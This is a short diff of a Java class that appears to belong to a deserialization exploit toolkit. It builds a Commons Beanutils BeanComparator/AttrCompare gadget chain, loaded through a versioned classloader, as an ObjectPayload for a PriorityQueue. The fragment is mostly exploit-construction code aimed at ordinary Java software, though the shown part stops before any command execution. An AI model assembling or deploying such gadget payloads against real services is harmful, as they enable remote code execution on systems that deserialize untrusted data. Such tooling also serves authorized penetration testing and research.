@@ -24,13 +24,11 @@ public class CommonsBeanutilsAttrCompare_192 implements ObjectPayload<Queue<Obje
     public Queue<Object> getObject(Object template) throws Exception {
 
         AttrNSImpl attrNS1 = new AttrNSImpl();
-        CoreDocumentImpl coreDocument = new CoreDocumentImpl();
-        attrNS1.setValues(coreDocument,"1","1","1");
         StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
         Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
         System.out.println(u.getPackage());
 
-//        BeanComparator beanComparator = new BeanComparator(null, new AttrCompare());
+
         Object beanComparator = u.getDeclaredConstructor(String.class, Comparator.class).newInstance(null, new AttrCompare());
 
 //        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<?>) beanComparator);
